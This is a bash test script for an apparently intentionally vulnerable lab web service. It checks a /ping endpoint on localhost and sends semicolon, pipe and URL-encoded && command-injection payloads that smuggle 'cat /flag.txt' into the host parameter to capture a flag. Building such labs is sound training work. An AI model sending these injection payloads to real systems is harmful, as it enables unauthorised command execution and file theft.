#!/usr/bin/env bash
set -e
DC=$(docker compose version &>/dev/null && echo "docker compose" || echo "docker-compose")

$DC down 2>/dev/null || true
$DC up --build -d
trap "$DC down" EXIT
sleep 3

# 1. Normal request: no flag
OUT=$(curl -sf "http://localhost:8080/ping?host=127.0.0.1")
if echo "$OUT" | grep -qE 'POC\{'; then
  echo "[-] FAIL: flag returned on clean input"; exit 1
else
  echo "[+] PASS: clean input returns ping output"
fi

# 2. Semicolon injection
OUT=$(curl -sf "http://localhost:8080/ping?host=127.0.0.1;cat+/flag.txt")
if echo "$OUT" | grep -qE 'POC\{[0-9a-f]{32}\}'; then
  echo "[+] PASS: semicolon injection captured flag"
else
  echo "[-] FAIL (;): $OUT"; exit 1
fi

# 3. Pipe injection
OUT=$(curl -sf "http://localhost:8080/ping?host=127.0.0.1|cat+/flag.txt")
if echo "$OUT" | grep -qE 'POC\{[0-9a-f]{32}\}'; then
  echo "[+] PASS: pipe injection captured flag"
else
  echo "[-] FAIL (|): $OUT"; exit 1
fi

# 4. && injection (URL-encoded)
OUT=$(curl -sf "http://localhost:8080/ping?host=127.0.0.1%26%26cat+/flag.txt")
if echo "$OUT" | grep -qE 'POC\{[0-9a-f]{32}\}'; then
  echo "[+] PASS: && injection captured flag"
else
  echo "[-] FAIL (&&): $OUT"; exit 1
fi

echo "[+] All tests passed"
